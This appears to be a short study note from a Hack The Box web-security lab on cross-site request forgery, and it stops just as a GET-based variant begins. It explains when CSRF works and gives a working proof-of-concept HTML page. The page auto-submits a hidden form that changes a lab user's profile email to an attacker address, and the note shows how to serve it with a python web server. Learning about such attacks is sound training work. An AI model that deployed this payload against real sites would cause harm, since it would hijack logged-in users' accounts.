## CSRF
#### A web application is vulnerable to CSRF attacks when:
- All the parameters required for the targeted request can be determined or guessed by the attacker
- The application's session management is solely based on HTTP cookies, which are automatically included in browser requests
#### To successfully exploit a CSRF vulnerability, we need:

- To craft a malicious web page that will issue a valid (cross-site) request impersonating the victim
- The victim to be logged into the application at the time when the malicious cross-site request is issued
#### Activate Burp Proxy and click "Save" on the web page you're authenticated to
![[CSRF - 1 form.png]]
*We notice no anti-CSRF token in the update-profile request. Let's try executing a CSRF attack against our account (Ela Stienen) that will change her profile details by simply visiting another website (while logged in to the target application).*
#### Create and serve the following HTML page
```html
<html>
  <body>
    <form id="submitMe" action="http://xss.htb.net/api/update-profile" method="POST">
      <input type="hidden" name="email" value="attacker@htb.net" />
      <input type="hidden" name="telephone" value="&#40;227&#41;&#45;750&#45;8112" />
      <input type="hidden" name="country" value="CSRF_POC" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      document.getElementById("submitMe").submit()
    </script>
  </body>
</html>
```

This was taken from the following page:
![[CSRF - 2.png]]
#### Serve the image on a python web server
```Shell
python3 -m http.server 1337
```
#### While logged in as the user, go to the web page at `http://<attacker ip>:1337/notmalicious.html`
![[CSRF - 3.png]]
## CSRF (GET-based)
#### Authenticate to the app and save the profile. You should see the following:
![[CSRF - 4.png]]
#### Activate burp suite's proxy (Intercept On) and click "Save" again.

